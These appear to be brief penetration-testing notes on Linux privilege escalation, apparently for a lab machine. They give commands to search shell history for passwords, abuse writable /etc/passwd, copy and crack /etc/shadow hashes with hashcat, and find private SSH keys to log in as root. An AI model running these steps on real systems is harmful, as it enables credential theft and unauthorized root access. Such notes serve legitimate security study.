Passwords and File Permissions : 

1. Stored Passwords : 
	-> run the : history command to check if any password is there 
	-> cat .bash_history
	-> use linpeas.sh or linenum.sh 

2. Weak File Permission : 
	-> ls -al /etc/passwd
	-> ls -la /etc/shadow
	Check the permissions of these file 
	1. if we have edit permission on /etc/passwd then we can change our id to 0 

	2. if we have permission to read /etc/shadow then
		- copy the /etc/password file and /etc/shadow file 
		- unshadow password_file shadow_file 
		- edit the unsahdowed file and remove the unnecessary hashes just go with root and user
		- now run these hashes against hashcat using this command 
			hashcat.exe -m 1800 creds.txt rockyou.txt -o : this command is for window
	
3. Hunting for SSH Keys 
	- find / -name authorized_keys 2> /dev/null
	- find / -name id_rsa 2> /dev/null
	id_rsa is our private key 
	if we find the key then 
	- copy the key to kali machine 
	- chmod 600 id_rsa
	- ssh -i id_rsa root@10.10.120.151
